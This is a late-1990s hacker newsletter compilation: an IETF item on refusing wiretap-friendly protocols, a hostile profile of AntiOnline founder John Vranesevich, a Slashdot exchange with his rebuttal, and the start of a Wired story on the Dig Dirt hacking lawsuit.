      This week, the IETF received an open letter signed by 63 privacy 
      advocates, computer security specialists, computer technology educators, 
      lawyers, and executives, urging the group not to adopt new protocols to 
      facilitate wiretapping. The letter says such a development       will harm 
      security, fail to prevent crime, and would be inconsistent with previous 
      IETF actions. 

      When the vote came, only a few hands went up to the question, "Should the 
      IETF support protocol features whose sole use is for wiretapping?" At 
      least 60 percent of the members present voted no and the rest abstained.

      "If there was any one consensus that came out last night, I would say it's 
      that the IETF in a political sense, not a technical sense, finds the idea 
      of invasion of privacy pretty unpalatable," Baker says. "That's not 
      something we would like to make easy."

      But Baker acknowledges there's more to the subject. IETF will issue a 
      statement on the topic, probably within a future IETF communiqué on privacy,
      Baker says.

      The Synthesis Article by bronc buster;
      
      If you are familiar with the Internet I am sure you know that there are 
      millions of sites online covering everything from how to change a flat 
      tire to how to get rich quick. As you may also know, there are a ton of 
      nuts out there, and self-proclaimed "kings of the Internet" who are online 
      gods in their own minds. Well I am going to tell you a tale about John 
      Vranesevich, or "JP," as he likes to be called online. JP runs a site 
      called antionline.com, which he proclaims is a sort of headquarters for 
      people fighting hackers around the world. He boasts on his web site about 
      working closely with the U.S. Military, NASA, the Defense Information 
      Systems Agency and the FBI to help track, stop and catch evil, criminal 
      hackers. This is his mission, and he lets nothing and no one stand in his 
      way. In his mind, JP stands supreme with a big bank account and ample 
      resources to back him up.

      So, tell me if this sounds familiar to you: Have you ever gone into a 
      "chat room" or got on IRC and witnessed a user getting mad and blubbering 
      that they were going to "get" someone they were mad at? They
           might 
      say that they know how to find out where that someone lived, like they 
      were some sort of "Internet cop," and that they had some sort of mystical 
      powers to get a person in big trouble if s/he didn't immediately stop 
      whatever offensive actions s/he had perpetrated. If you have ever seen 
      anything like this happen, then this story won't be a new one, just maybe 
      a bit more complex and a bit more interesting. 

      John "JP" Vranesevich started out in Pennsylvania, in a city that he says 
      had very limited computer resources. He boasts that, when he was 15 years 
      old, he was the driving force behind getting a computer lab
           upgraded 
      from five to 75 computers. But wait a second; a little digging will 
      produce three different quotes, instances in which he said three 
      different things (see end of story for references). First he said it was 
      in a public library computer lab, and that he helped it grow from five to 
      75 computers; in another quote he said it was his old high school's 
      computer lab, and it went from 50 to 600 computers. 

      Once JP was out of high school, he moved on to the University of 
      Pittsburgh, a fine institution of higher learning, enrolling in a 
      computer science-related major. As all Freshman are required to, he had 
      to live in the
           dorms at PITT, which are said to be some of the 
      finest dorms in the country. They are wired with Ethernet connections 
      giving students unlimited access to the Internet, which was ideal for a 
      new student wanting to learn more in the field of computing sciences.

      As he entered school, JP also started a small personal Web site on an 
      Internet account he got from a friend. Or was it an account from a local 
      Internet Provider that he was given in thanks for helping set up that lab
           
      earlier? That point is also unclear; it appears he has claimed both. At 
      any rate, this was the beginning of AntiOnline. Soon after he moved into 
      the dorms and saw he had unlimited access to the Internet, he decided to 
      move his project site into his room and started running antionline.com 
      off of a small computer running Windows NT. Even though JP had signed an 
      agreement to obey the rules regarding use of his Internet connectionrules 
      which strictly forbid running any type of server like he washe pushed 
      ahead thinking he was protected by his right to freedom of speech. As he 
      became a fledging hacker wannabe in the underground community, JP started 
      to make friends and because his unlimited access to the 'Net was so rare 
      back then, he started to give out e-mail accounts, space for people to 
      put up Web sites, and began trading in stories of the latest hacker 
      exploits. I had an account on his box back then; in fact, I had several 
      accounts. However, in his conversations with the coordinator of 
      residential computer services at Pitt, Lee Bannister, JP said he never did 
      such things and that his server was just a personal box he experimented 
      with.

      Needless to say, it didn't take long for the authorities at Pitt to see 
      what JP was doing. After he was contacted by a group in Spain about 
      releasing a new type of Windows attack (the infamous Win-Nuke) via
           
      his site, his traffic went up and the authorities took notice. At first 
      they contacted JP and told him what he was doing was illegal and asked 
      him politely to stop. He simply ignored the warning. Next they 
      disconnected his room's Internet access and advised him to reread the 
      agreement he had signed. JP ignored them and just moved his box to a 
      friend's room, where he went back online. Then, after he was caught 
      several times in the school's computer labs attempting to launch Denial 
      of Service attacks against several Internet Service Providers across the 
      country, he was brought up on charges regarding his use of dorm Internet 
      access. JP was threatened with expulsion from Pitt.

      "What!?" cried JP. "They are restricting my freedom of speech!" His 
      friends and hackers from across the underground community rallied to his 
      aidat the time, it reminded me of that really poor movie
           called 
      Hackers, in which, at the end, hackers from around the globe unite to 
      stop some evil company from taking over the world, or something like 
      that. 

      JP was invited to be a guest on a weekly hacker radio show in New York 
      City called "Off The Hook," which is done by the fine people at 2600 
      Magazine. He was invited to talk about his problems at Pitt and
           
      people responded by e-mailing, calling and writing the authorities at 
      Pitt who were doing this to poor JP. Soon the noise that the underground 
      was making started to get noticed by the mainstream media and stories 
      started popping up. Under the pressure of all the media attention, Pitt 
      agreed to back down, but only if JP agreed to obey their rules from then 
      on. He agreed. 

      Only a few weeks later, the Internet access in JP's dorm room was cut off 
      again, and again he started to complain about Pitt unjustly targeting 
      him. He said that because of the way he was treated, he decided
           to 
      drop out of school and work on AntiOnline full time. What a bold, brave 
      move. After only one semester, at the tender age of 19, JP was quitting 
      school, not wanting to bother with learning any longer and heading out 
      with what he knew to take on the world. 

      When I contacted Pitt several months ago, Lee Bannister told me the 
      reason JP's Internet access was cut off was that he had again broken 
      their rules and put his server back up in his dorm room. Ken
           
      Service, the spokesmen for Pitt, said in a public statement that all the 
      documents regarding his case were on file at Pitt, and said that the 
      school "had really made a genuine effort to assist him [JP] in running the 
      site within the policies and restrictions of the University." 

      JP was still riding high on his chariot of fame when some of his friends 
      told him about a hack they had done. He figured it would be cool to do a 
      little story about how elite his pals were, and put up a little story
           
      on his site for everyone to read. After a few weeks, more people started 
      telling JP of their exploits and soon AntiOnline was a regular stop for 
      people who wanted to see the latest hack or the status of the latest 
      online hacker gang war. Then one day, a story popped up about how hackers 
      who JP knew had broken into several systems at an Indian nuclear research 
      center and stolen documents and e-mails regarding recent nuclear tests 
      conducted near the border of Pakistan. Because this was such a hot bed 
      issue in the news at the time, the mainstream media jumped all over it. 

      JP recounted in several interviews how he was in his parents' living room 
      fielding calls from everyone from the FBI to the Department of Defense to 
      various nuclear research centers across the country. The
           next day JP 
      was on the CBS News, quoted in the New York Times, talked about on CNN 
      and was referred to by countless other media outlets. This was the chance 
      that JP had hoped and waited forfinally, big-time exposure for him and 
      his site. When he was later interviewed by Lewis Z. Koch, of the Cyber 
      Wire Dispatch, regarding the validity of these events, JP incorrectly 
      said that it was a research center in Israel that was hacked, and that he 
      hadn't really witnessed any of the hacks himself, he was just going on 
      the word of the 12- and 14-year-old kids who said they did it. JP never 
      released any of the documents he said he was given, but somehow he had 
      little snippets translated for him so he could post tidbits on his site.

      One day early last year, JP was contacted by some people who knew little 
      about the fledgling Internet, and somehow decided that it would be a good 
      idea to invest somewhere around $250,000 in JP and
           AntiOnline. Who 
      would do such a thing and take such a risk? To tell the truth, no one is 
      sure. According to an article in the New York Times, it was a large arts 
      and crafts company in Ohio called Darice Inc., but when contacted, the 
      company spokespeople said they had no idea who John Vranesevich was, and 
      knew nothing about any Web site called antionline.com. When I informed 
      Matt Richtel, the reporter who had done the New York Times story, that the 
      name of the company he was given for his story was bogus, he asked me to 
      ask JP. He wanted to knowas much as I didif and why JP had lied. 

   With the cash, JP got an office, set up some computers, got a high-speed 
   connection to the Internet and hired an old friend to help run things. From 
   there, he started to get sponsors, expand his empire and got
           people to 
   write articles for him. It was an interesting time, to say the least. His 
   site was one of the first of its kind to get investment capital and to go 
   commercial, another note that the media was quick to pick up on. Once his 
   site was back up and all his ducks were in a row, JP went back to doing what 
   he did bestreporting on the things his friends did, mixing in news blurbs 
   from time to time.

      Soon things started to change for JP and his site. After people (kids, 
      really) started to see that they could get some much-desired attention 
      (maybe their parents weren't giving them enough), they started to
           
      manufacture hacks specifically for AntiOnline and JP. It used to be that 
      Web page hacks had some sort of reasoning behind them (most of the time), 
      but soon they started to be more and more brainless. The hacks started 
      being nothing more than a few cuss words and a friendly hello to JP and 
      AntiOnline, in hopes of bettering their chances of getting a small story 
      and making them famous for a few days. It was starting to become clearJP 
      was almost encouraging crimes so that he would have something to report 
      on. The more stories JP had, the more hits he could maintain. The more 
      hits he had, the more his sponsors would pump resources into AntiOnline. 
      It was simple economics, supply and demand, and JP wasn't going to 
      disappoint. 

      At the rate JP was going, it didn't take long for other people to start 
      to see through his façade and to see what he was really up to. It became 
      clear that JP had started to put a glitz on stories, and was taking
           
      editorial liberties when reporting on them in order to sensationalize 
      them. JP denies ever doing any such things, of course. 

      A story that JP reported once comes to mind, one about a group of kids 
      who had broken into the Defense Information Systems Agency and stole a 
      "Top Secret" program that outlined networks for the military and
           the 
      Pentagon. Reportedly, JP had gotten to see some of the information that 
      came with this program and he said that, via his "sources" in the 
      government, he was able to verify that this program was real. JP was on 
      CBS News a few nights later, along with one of the 14-year-old kids 
      (whose face was shadowed out) who said he had stolen it. It made headline 
      news on television, on radio talk shows and in major papers around the US. 
      And what a story it was. As usual, the government wouldn't comment on any 
      of it, so it was hard to know what was the truth and what wasn't. 

      After a few weeks had passed and the attention started to die down, an 
      e-mail popped onto a public mailing list, a list where people were 
      talking about JP and his site. The mail said that JP's report on the 
      secret
           military program was a hoax. It outlined how anyone could go 
      to the Web site of the company that made the programs the government 
      used, and how anyone could download them for a free trial period. After 
      it was proven that what this e-mail claimed was true, a minor uproar 
      ensued within security and hacking circles across the Internet. People 
      demanded that JP correct his stories and admit that what he printed was 
      false. Instead, JP simply took the story out of his news archives and 
      never spoke on the subject again. A clean sweep under the rug.

      A few months passed and the flames of the fire under JP and AntiOnline 
      were roaring. Everyone was up in arms over his stories and reports. 
      Several of his previous reports were being reviewed and some were
           
      being proven false. People wanted to know how could he get away with such 
      a hoax. Some of his stories were true and others appeared to be totally 
      made up. As reports started to surface, and as some people started to mark 
      JP as a sham, he started to panic. He pulled out his trump card and 
      started sending letters and e-mails to people around the Internet telling 
      them to stop doing and saying whatever it was he didn't like, under the 
      threat of legal action. 

      People had set up parity Web sites, places like AntiOffline, 
      Anti-AntiOnline and the Innerpulse News Network, so he sent some of them 
      e-mail whining for them to stop making fun of him, or he would bring them 
      to
           court. He even went as far as sending e-mail to a 15-year-old 
      high school kid who wrote and Web-posted a paper with a fictional person 
      in it named "PJ," because he thought it might be somehow poking fun at 
      him. Yes, JP told him he would seek legal actions against himor his 
      parents, or whomever he couldif he didn't take down his story. He sent 
      e-mails to people running sites like Attrition, to their Internet 
      provider, and to their Internet provider's provider, complaining about how 
      attrition.org kept an archive of all the errors he had made, and how they 
      were pointing them out to people whenever they were asked to. As a matter 
      of fact, he even sent me e-mail telling me he would take legal actions 
      against me if I didn't leave him alone. Hell, I bet The Synthesis gets a 
      threatening e-mail after this story runs.

      Adam Penenberg, a columnist and the senior editor at forbes.com, the 
      Forbes Magazine online site, said in a recent article, "Of course, JP has 
      nothing against good press. It's the bad press that lets him
           
      unsheathe his sharpest weapon. No, not the facts; those would only get in 
      the way. We're talking about the threat of a lawsuit." The list of people 
      he has threatened to sue is longer than Santa Claus' Christmas list. Only 
      one minor detail JP seemed to forgetwe, his detractors, are also 
      protected by the First Amendment, entitled to our opinions. If he doesn't 
      like them, he doesn't have to listen. 

      After JP's suing spree ended, he turned himself into the laughing-stock 
      of Internet security and hacking circles by changing his mission 
      statement. He went from being a reporter and a self-proclaimed security
           
      expert to being a simple "security enthusiast" and the Net's "number one 
      hacker-catcher." He had, in effect, declared war on the underground 
      because it hadn't accepted him as one of its own. 

      "I have yet to see anything useful come out of AntiOnline or John 
      Vranesevich; he has not contributed anything to the online community. Not 
      one line of code, not one exploit, not one advisory has he issued. Most 
      of
           the content on his Web site has been taken from elsewhere. He has 
      done absolutely nothing, yet somehow maintains his status as some sort of 
      information security God," says Space Rogue, who works with L0pht Heavy 
      Industries (hacker collective on the forefront of the movement) and is 
      the editor of the Hacker News Network.

      Mainstream media outlets stopped quoting JP, his sponsors started to 
      withdraw their support, his hits were starting to drop, and according to 
      one of his writers, he was finally operating in the red. 

      "With his change in editorial viewpoint, however, along with his waning 
      credibility among hackers, JP and AntiOnline became simply less useful to 
      me as a source of knowledge or expertise. There are better
           sources 
      for me to use to gain access to the hacking community, and there are 
      better sources among the anti-hacker security community as well," says 
      Michael Martinez, an Associate Producer at ABCnews.com, regarding JP's 
      current stance on hacking. "This isn't a slam against JP or his site, 
      because he's free to take his publication in any direction he likes and I 
      wish him well. But for my purposes, the thing that made his site 
      specialthat bridge between hackers and security expertsis no longer 
      there." 

      Other long-standing security sites were starting to gain his traffic, and 
      JP knew it. Packet Storm Security, one of the largest archives of free 
      security tools and security-related topics on the Web, was becoming the
           
      main site on the 'Net for people interested in security. It had gigs and 
      gigs of files and was updated every day, not to mention it was very 
      anti-JP. Packet Storm had become so popular that its owner, Ken Williams, 
      a graduate student at the University of North Carolina, couldn't afford 
      to continue to operate it paying all the expenses out of his own pocket, 
      so he asked for help. With the popularity of his site and how helpful he 
      was to the Web community, an army lined up to offer him assistancea line 
      that included Harvard University, who offered to host his site on their 
      systems for free. Ken jumped at the idea and spent the next month moving 
      his site over, getting the system ready and putting in countless hours of 
      upgrades for the grand re-opening. When it reopened, Packet Storm was 
      getting hundreds of thousands of hits every day and was by far the 
      biggest, most popular and most supported freeware security site on the 
      Internet at that time, or for that matter, ever. 

      What did JP do? In typical fashion, he bought a special computer program, 
      or "bot" as they are called, which, when let loose on a Web site, 
      basically rips off the entire site. He downloaded the Packet Storm info 
      to
           AntiOnline for examination, and JP took what he wanted from it. 
      During this raping of the Packet Storm site, the bot came across a 
      private directory (not a publicly-visible directory). It had a picture of 
      JP and his sister from their high school's online year book, as well as a 
      collection of a few e-mails and Web sites Ken had been sent regarding JP 
      (none of which were very favorable towards JP, but none of which I saw 
      advocated violence or contained pornography). 

      
      JP saw an opportunity and he ran with it. The next day, he contacted 
      Harvard and told them Ken had a directory on his site containing 
      "pornographic material," "degrading pictures" of him and his family, and 
      contained "death threats" against the Vranesevich clan. He even went as 
      far as to say he had hired a full-time security guard for his offices 
      because he feared for his life, and that Harvard was going to have to pay 
      the price if they didn't remove the site ASAP. Again in typical fashion, 
      JP implied he was going to take legal actions against them. Harvard's 
      reaction was knee-jerk: It had never been in a situation like this 
      before, so the school sent someone to pull the plug on Packet Storm and 
      dismantle the box. It was done so fast they didn't even talk to the 
      administrators at Harvard who had direct control over the box, and didn't 
      even notify Ken as to what was going on. 

      Again, an online riot ensued. Wired and Zdnet ran stories on what had 
      happened, and security circles and hackers alike were in an uproar, 
      wanting JP's proverbial head on a digital platter. Because the site was
           
      part of Ken's Master's degree project and his access to it was totally 
      cut off for weeks, he had to drop out of school or risk taking failing 
      marks. There were rumors that Harvard might try to sue him, and JP as 
      well. Soon the tide started to turn, the truth came out and JP found 
      himself taking the brunt of the 'Net community's wrath. Ken was a popular 
      person and his site was totally free, while JP was despised by many and 
      his site was commercial. 

      At DefCon '99 (DefCon is an annual hacker convention held in Las Vegas), 
      there were "Wanted" posters all over the hotel. They featured a picture 
      of JP, called him a narc and gave information about some of the
           
      stuff he is alleged to have done. There were so many sites on the 'Net 
      going after JP, it was difficult to keep track of them all, and the 
      number of attacks against AntiOnline soared so high that the site's 
      Internet Provider, StarGate.net, had to pull the plug on his site several 
      times to avoid crashing their entire network. 

      All this wasn't totally bad, though. Ken Williams was eventually offered 
      a high-paying security job and his site was bought for a reported (not 
      confirmed) $125,000 by the security firm Kroll-O'Gara, and put back
           
      online a month later. 

      According to Carolyn Meinel, a staunch JP supporter, writer, consultant 
      and far from a favorite in hacker circles herself, "John Vranesevich 
      showed courage and compassion for his kid sister when he complained
           
      to Harvard that Ken Williams' Packet Storm Web site carried her photo, 
      home address and incitements to harm her. Vranesevich could have just sat 
      on his rear end and waited for the police to go after Ken. Instead, he got 
      the threatening material removed forever from the Web, Williams got paid 
      a ton of money for the technical portion of Packet Storm, and now the 
      loud mouths of the computer security industry say Vranesevich was the bad 
      guy." 

      Despite these kind words from his friend, JP is still on the outs with 
      most of the security world and hackers alike. As of this day, if you were 
      to visit AntiOnline, it would almost read like you were on the Web site 
      of
           an extremist group. JP comes across like he is against anything 
      and everyone whose views do not match his, and he is apparently very 
      bitter because of the nonstop attacks against him. In a recent story 
      posted on his site, 
      (http://www.antionline.com/cgi-bin/features/News_Spoof?date=10-06-1999) 
      he joked about how some of his critics at Attrition had joined forces 
      with pedophiles. After being accused of this, Brian Martin, the founder of 
      Attrition and a security professional said, "It is truly unfortunate that 
      a single person is duped by Vranesevich and AntiOnline. Their history of 
      libel and slander, inaccurate and biased 'journalism,' sparse news updates 
      and other unprofessional behavior represents the baseline of negativity 
      and unethical actions." 

      How low can someone go when they say their critics rape children? Why 
      does he do it? It's simplehe wants the attention. There is an old 
      saying, "bad press is still press," and at this point, JP is itching for 
      any
           press he can get to drive up his hits, even if it means pissing 
      off everyone on the Internet in the process. 

      "I am constantly amazed at how John Vranesevich pisses off large numbers 
      of people seemingly on purpose. From my point of view, it seems as though 
      he purposely stirs up controversy to draw attention to his
           site and 
      himself," says L0pht Heavy Industries' Space Rogue. 

      "We're thinking about making JP honorary director in charge of global 
      marketing [for Packet Storm Security]," says Matt Barrie, the current 
      director of Packet Storm Security for Kroll-O'Gara, in a blatantly
           
      sarcastic, humorous tone. "He created the opportunity for us to obtain 
      it, creating so much hype in the process that we now get more hits to the 
      site than Ken ever did, plus he links to us from AntiOnline. We love the 
      guy! The more he says, the more we benefit! Keep up the good work!" 

      At this point, JP will probably be glad this article came out just 
      because it's more time his name will spend in the print.

      The JP story continues on to this day. People are still criticizing him, 
      attempting to prove him as a fake, while he still goes on writing stories 
      and continuing to "work with the FBI catching evil hackers across the
           
      country," as he boasts. Well, that last part is still a matter of debate. 
      When I contacted the FBI's public relations department and submitted my 
      questions regarding JP and AntiOnline, they said they do not comment on 
      any ongoing case, anyone they might have under investigation, or anyone 
      who might be working with them anonymously supplying tips. They did note, 
      however, that they had no records of any contract with anyone named John 
      Vranesevich or a company called AntiOnline. I guess this means he could 
      be supplying tips to the FBI, anonymously or otherwise, but anyone can do 
      that via a 1-800 number. Besides, does that constitute a working 
      relationship with the FBI? I think Ken Williams, founder of Packet Storm 
      Security who now works professionally in the security world, put it best: 

      "The fact that the FBI 'consults' with JP does not in any way validate 
      the work of a technologically-inept jackass who thrives on intimidation. 
      It does, nevertheless, illustrate why the FBI should now give Special
           
      Agent badges to JP, Elvis and maybe even the Easter Bunny."

      The non-interview;
      
      Posted by Roblimo on Friday November 12, @11:22AM from the 
      bobbing-and-weaving-and-ducking dept. Monday, when we asked you to Grill 
      John Vranesevich, we got mostly flames (as expected), but somehow we 
      managed to extract 12 hard-nosed questions from the ashes. Sadly, Mr. 
      Vranesevich chose not to respond to them directly, but sent an 
      argumentative screed instead. Below you'll find the questions we sent, 
      followed by Mr. Vranesevich's essay in its entirety (including his 
      original HTML formatting), along with a link to a Forbes story that is, 
      um, not exactly complimentary to him. 

      Question #1 by manitee 

      Having read many accounts of your interactions with the staff of 
      attrition.org, it seems to me that your claims against them are generally 
      unproven and rash. Their rebuttals are always filled with detailed fact 
      and systematic, step by step analysis of the topic at hand. Please clarify 
      why you feel that attrition.org is such a dangerous force, yet you have 
      never been able to present HARD EVIDENCE to that point. 

      Question #2 by davidu 

      Many of us in the hacker community (not cracker) used the Packet Storm 
      security site for information and research. You had it shut down for some 
      alleged things in the /jp directory. Explain to us why you called 
      [Harvard] to shut it down rather than dealing with the maintainer. What 
      did you accomplish by threatening to sue other than futher harm your image 
      and remove any creditbilily you had? 

      Question #3 by Kintanon 

      What is the basis for your attacks on security Experts such as 
      Attrition.org? 

      To Clarify the question: Why do you proclaim them to be 'dangerous 
      hackers' while they do essentially the same thing you claim to do, except 
      that they do so better, faster, and more professionally? 

      Question #4 by mattc 

      Why did you deliberately block links from Slashdot, HNN, and any other 
      site who criticized you during the closure of Packetstorm? 

      #5 by WH How do you respond to allegations that the FBI is investigating 
      your knowledge of attacks before they happened and the accusations by some 
      hackers who performed said attacks that you paid them or otherwise coerced 
      them to do it in order to have coverage for your website? 

      #6 also by WH 

      Why do you feel that sites containing satirical humor based [on] 
      antionline are not protected by law and therefore open to your threats of 
      legal action? 

      #7 by Hard_Code 

      Are the rumors that you will be spinning off a sister site called 
      Anti-Anti-Anti-Online to dispell the malicious accusations and 
      deprecations of your obviously magnanimous professionalism and intellect 
      and to further bolster the image of Anti-Online and your integrity as a 
      computer- security- expert- guru- enthusiast, true? 

      #8 - #11 by Jeff - (Heavily edited - RM) 

      I have several questions which I will ask within the narrative below. The 
      narrative is important to understand the context of the questions, and to 
      support my arguments. 

      Several months ago I was raided by FBI for supposed involvement with the 
      "hacker" group gh. The extent of my involvement was participating, as a 
      caller only, in illegally funded phone conferences. JP, who also 
      participated in this conferences, labeled me as a hacker, and a member of 
      gh on his "news" site. Neither of these accusations are true. He has many 
      more ties to this and other hacker groups than I have ever had.... 

      #8 - How can you pretend to be taking a stand against "hackers" while you 
      are involved in the same activities? 

      #9 - My third question is in regards to your coverage of the situation. 
      You posted unconfirmed information from an unreliable source in regards to 
      the status of my employment at a prominent software development company. 
      As a result of this I was contact by several news agencies, and 
      immediately stereotyped as a hacker even though I have never illegally 
      penetrated any computer system, nor had I been charged with, or accused of 
      any crimes by the FBI. In response to this I granted one news agency an 
      interview, which I thought went well, but also backfired. As a result of 
      the negative press my former employer could not even consider allowing me 
      to stay. My question being, Do you expect people to consider you as a 
      reliable news source even though you report data which you receive through 
      unreliable channels? 

      #10 - Did you ever stop to think what the impact of your coverage might 
      be? It seems to me that in your rush for the big story you have failed to 
      check for the correctness in your articles, and as a result of this you 
      are hurting innocent people, such as myself. I'm sure this has gone on in 
      other cases, but mine is the only one I have enough knowledge to comment 
      on. I don't attribute these unfortunate events to you, but you certainly 
      did not follow good news practices in reporting them. You have only served 
      to injure my credibility and your own. 

      11 - Lastly, have you ever considered what legal action may be taken 
      against you for your involvement with these criminals? Do you even 
      recognize the hypocrisy of your stance on hackers being one yourself by 
      your own definition? 

      Question #12 by sonoffreak 

      Why did you decide to let Slashdot interview you? How did the response you 
      got compare to what you expected? 

      John Vranesevich's Response: 

      Greetings All

      Well, I've seen many people say that I can't take criticism. Believe me, 
      if that were true, I surely never would have opened myself up to a 
      SlashDot inquisition. I knew before I even agreed to the interview, that 
      things would be ugly. Needless to say, I was right on the money. However, 
      I will say this. I was very disappointed in the downright lack of maturity 
      that many of the posts showed. I like to believe that most people who 
      frequent this type of forum are of an intellectual nature. I found it very 
      disheartening to hear nearly every rumor ever voiced about myself or my 
      company being regurgitated as if they were all fact. An educated bunch of 
      people should understand that not everything that they hear is true at 
      all, and that almost nothing that they hear is totally accurate. But, some 
      of that could be my fault. Many posts pointed out the fact that I have 
      never "given explanations of" or provided "blow-by-blow responses" to any 
      of the things that have been written about me. This is true. If I spent my 
      life defending myself from every individual who had a nasty thing to say 
      about me, my life would end up pretty meaningless in the end. I think 
      that's true for most people. I decided a long time ago that I wouldn't 
      allow myself or my website to become dedicated to those who would seek to 
      bring me down. I have a lot of goals in my life, and I'm not about to let 
      nonsense get in their way. But, never the less, I saw this SlashDot 
      invitation as the perfect opportunity to talk about some of those very 
      issues. It's not that I feel that people who posted negative comments will 
      read what I have to say, and then decide that they were totally wrong 
      about me. Those who despise me for whatever reason will continue to do so 
      no matter what I ever say or do. Even SlashDot faced the wrath of dozens 
      of people who are "no longer going to visit this site" for one reason or 
      another after reading the interview bio on Monday. So much for loyalty in 
      this day and age I suppose.

      Yours In CyberSpace, John Vranesevich Founder, AntiOnline


      Now, On To The Questions

      I received a list of "questions" from Robin earlier this week, and to put 
      it bluntly, they were just stupid. I'm not going to waste my time writing 
      up ridiculous answers to ridiculous questions that no one really cares 
      about. For example, here is one of the questions posed to me

      "Are the rumors that you will be spinning off a sister site called 
      Anti-Anti-Anti-Online to dispel the malicious accusations and deprecations 
      of your obviously magnanimous professionalism and intellect and to further 
      bolster the image of Anti-Online and your integrity as a 
      computer-security-expect-guru-enthusiast, true?"

      Now how stupid is that? What would my answer be, something like "Um, no". 
      Not a very stimulating Q&A if you ask me.

      So, instead of wasting my time and yours, I decided that I'd simply cut to 
      the chase, and answer what appear to be some of the major allegations, 
      accusations, and other such tidbits that some people seem obsessed over.

      AntiOnline & PacketStorm

      First off, let me say that I didn't shut down PacketStorm, and neither did 
      Harvard. Ken Williams is the sole person responsible for that site being 
      shut down. He chose to take a popular forum which was designed to 
      disseminate information related to computer security, and abuse his own 
      creation in order to harass someone. Sure, post satire about myself or my 
      website. I truly don't care, and in many cases, I have even promoted such 
      websites on AntiOnline. One such satire site that I've linked to several 
      times is "AntiOffline.com". Personally, I consider satire as one of the 
      greatest type compliments one can get. However, what Ken did far surpassed 
      simple satire. By posting a photo of my younger sister (who was a minor at 
      the time), along with her full name and address, he successfully started a 
      mass campaign of harassment against her and my family. This I wouldn't 
      tolerate. I don't care how popular of a site it was, or how valuable of a 
      resource it was. It was abused by Ken Williams for his own perverse sense 
      of amusement, at the cost of my family.

      As for all of this "threaten to sue" hype which soon followed. I never did 
      any such thing. I'm not sure which University Official ever told Ken 
      Williams that, if any, but he was certainly mistaken. I sent a simple one 
      page e-mail to the provost's office asking them to review the contents of 
      the site against their acceptable use policy. Despite Ken's claims that 
      there wasn't any "offending" material on the site, the university reviewed 
      it, and chose to shut it down. A major and prestigious university like 
      Harvard wouldn't simply shut down a site because some pissant like myself 
      sent them an e-mail, unless there was a very good reason to do so. Use 
      your common sense people.

      However, what Ken Williams did was a very successful campaign of pity 
      afterwards. I will admit that. "A poor college student who's website was 
      shut down by an evil corporation called AntiOnline. Who's college career 
      has been ruined, and all of his hard work lost". Truth of the matter is 
      that Ken is in his 30s, and isn't some naive little college freshmen. He 
      got his site shut-down by harassing a 17 year old girl, which shortly 
      after being shutdown, Ken sold for a reported $125,000 to Kroll.

      Poor Ken.

      AntiOnline & Attrition

      This is even more stupid than Ken Williams. Despite all of the crap, and 
      there really isn't a better word for it, which has pored out of Brian 
      Martin and his Attrition.org site, I think I can sum up events in one 
      small paragraph

      AntiOnline was asked by the FBI to help investigate a group called "HFG" 
      which broke into the New York Times' Website. AntiOnline does some 
      digging, and turns over its findings. Shortly there after, Brian Martin, 
      founder of Attrition.org, and someone that no one at AntiOnline had ever 
      had any contact with before, was raided by the FBI. Ever since then, for 
      some strange reason, Brian Martin has attempted to do anything and 
      everything he can to discredit myself and AntiOnline. Wonder why? Is it 
      because I'm an evil menace to society that threatens the very existence of 
      the internet and all that is good? I wouldsubmit to you that Brian 
      Martin's motivations are far more geared towards protecting his own ass, 
      than they are geared towards protecting society's ass. Once again, use 
      your common sense.


      What exactly does AntiOnline Do?

      That's something I see asked a lot on "underground" type webpages. To be 
      frank, we're not a public company, and it really isn't anybody's business 
      except those that we work with. I can, however, tell you this. The fact 
      that nearly every malicious hacker (or cracker if you prefer the term) 
      dislikes AntiOnline is actually good for us, and is the exact position I 
      want to be in. Some people even "joke" that I intentionally try to "piss 
      off large groups of people at a time". Well, it's not just a joke, it's 
      the truth. I think I'm pretty good at doing it too. We average between 
      200-500 intrusion attempts against one of our systems AN HOUR, and every 
      time I piss another segment of the cyber-population off, that number 
      skyrockets. We probably have one of the most targeted networks on the 
      internet today, and we take full advantage of that. Do you think that we 
      let the type of data that we're able to collect and log just go to waste? 
      I don't ;-)

      Is AntiOnline Being Investigated By The FBI?

      To tell you the truth, I doubt it, but I don't know for sure. But, there's 
      a reason why I don't know for sure. The FBI doesn't talk to anyone about 
      who they are/have investigated. Anyone that has ever worked with the FBI 
      in any manner, can tell you that they, as a rule, keep quite in order to 
      protect any investigation. If they were to deny reports about us being 
      investigated, that would confirm in the minds of others that they are 
      being investigated, when the FBI comes up with a "no comment" answer. Make 
      sense?

      Here's where things get funny. The person that "blew the lid off of the 
      story" that AntiOnline was being investigated by the FBI is none other 
      than, you guessed it, Brian Martin of Attrition. He told a reporter that 
      an FBI agent "informed him" about the active investigation. 

      Common sense time. Would the FBI raid someone (like Brian Martin was), and 
      then shortly there after begin telling that person about all of the other 
      investigations that they are doing so that they could spread the word all 
      over the Internet and ruin their case?

      Personally, I would highly doubt that the FBI would consult with us if 
      they suspected, or were investigating the possibility, that AntiOnline was 
      some evil criminal empire that paid people off to break into high profile 
      websites so that we could post an interview. 

      Get real people.

      Does it bother you that everyone hates you. Why or why not?

      This is something that I actually saw posted on the message board. To be 
      honest, at this point in my life, my goal is not to become loved in the 
      hearts of the masses. I'm not running for political office, so popularity 
      doesn't count. I have goals in my life that I want to achieve. Some of 
      these goals are short-term, some of them are long-term. Right now, at the 
      age of 21 (as of October), I'm exactly where I want to be. My professional 
      career is on track, financially I'm in good shape, my personal life is 
      where I want it to be, and I can say that every day brings me closer to 
      the goals that I have set for myself. Who could ask for more? Sure, I have 
      to put up with a lot more flack and B.S. than the average 21 year old. But 
      I'll tell you this, every minute is worth it.

42.0  Strange Corporate Hacking Saga 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      

      http://www.wired.com/news/print/0,1294,32488,00.html
      by Craig Bicknell 
      
      3:00 a.m. 12.Nov.1999 PST Judge Thomas Penfield Jackson may have a head 
      full of Microsoft hoo-ha. But he's going to have to make some room for 
      another case. 

      No lofty antitrust issues here. This one's a weird little cyber-drama 
      starring a personal data-sales Web site called Dig Dirt, its 
      cybersquatting owner, and a prestigious law firm that allegedly hacked 
      into Dig Dirt's digs. 

      Michael Moore, owner of DigDirt.com's parent, Moore Publishing, this week 
      filed suit in US District Court for the District of Columbia accusing the 
      august Washington law firm of Steptoe & Johnson of launching a "cyber war" 
      against       Moore Publishing and Dig Dirt. 

      He's demanding US$10 million in damages, and the case has landed in 
      Jackson's court. 

      Moore charges that, among other things, Steptoe employees cracked into Dig 
      Dirt and other Moore Publishing sites some 750 times, posted defamatory 
